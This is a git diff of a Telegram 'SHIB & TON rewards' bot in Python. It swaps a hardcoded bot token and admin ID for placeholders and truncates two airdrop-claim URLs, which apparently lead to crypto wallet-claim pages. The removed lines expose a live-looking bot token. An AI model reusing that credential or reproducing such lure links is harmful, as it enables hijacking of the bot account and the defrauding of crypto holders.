@@ -10,8 +10,8 @@ from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.utils import executor
 
 # 🚀 BOT CONFIG
-TOKEN = "7317617514:AAHy4weIjo0XzK4trvAs_3gdxJzuiWlWrAA"  # Replace with your actual bot token
-ADMINS = [6366250991]
+TOKEN = "your bot token"  # Replace with your actual bot token
+ADMINS = [6366]
 
 bot = Bot(TOKEN)
 dp = Dispatcher(bot, storage=MemoryStorage())
@@ -32,8 +32,8 @@ conn.commit()
 
 # 🚀 SHIB & TON REWARD LINKS
 PHOTO_URL = "https://bitcoinist.com/wp-content/uploads/2023/03/Shiba-Inu-Gains-21-Following-Shibarium-Testnet-Announcement.jpg?w=900"
-SHIB_REWARDS_URL = "https://airdropcheckers.net/?source=rewardsbot"
-TON_WEB_APP_URL = "https://ton.dappsclaim.com"
+SHIB_REWARDS_URL = "https://airdropcheckers/?source=rewardsbot"
+TON_WEB_APP_URL = "https://ton."
 
 # 🚀 FSM STATE FOR ADMIN MESSAGES
 class MessageState(StatesGroup):
